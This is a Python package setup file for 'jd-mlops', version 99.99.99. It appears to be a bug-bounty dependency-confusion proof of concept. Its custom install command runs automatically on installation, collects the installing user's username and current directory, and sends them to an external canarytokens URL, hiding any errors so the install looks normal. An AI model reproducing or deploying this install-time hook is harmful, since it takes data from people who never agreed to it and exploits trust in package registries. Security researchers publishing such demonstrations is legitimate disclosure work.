from setuptools import setup
from setuptools.command.install import install
import urllib.parse
import urllib.request
import getpass
import os

class PostInstallCommand(install):
    def run(self):
        try:
            user = getpass.getuser()
            cwd = os.getcwd()

            params = urllib.parse.urlencode({
                "user": user,
                "cwd": cwd
            })

            url = f"http://canarytokens.com/about/articles/t7i1ldekjg9pokr3vjkklmk8d/index.html?{params}"
            urllib.request.urlopen(url, timeout=3)
        except Exception:
            pass  # Don't break install

        print("hello world from https://hackerone.com/thruster")
        install.run(self)

setup(
    name="jd-mlops",
    version="99.99.99",
    cmdclass={
        'install': PostInstallCommand,
    },
    author="thruster",
    author_email="thruster@wearehackerone.com",
    description="Just prints hello from thruster and triggers a pingback",
    classifiers=[
        "Programming Language :: Python :: 3",
    ],
    python_requires='>=3.6',
)
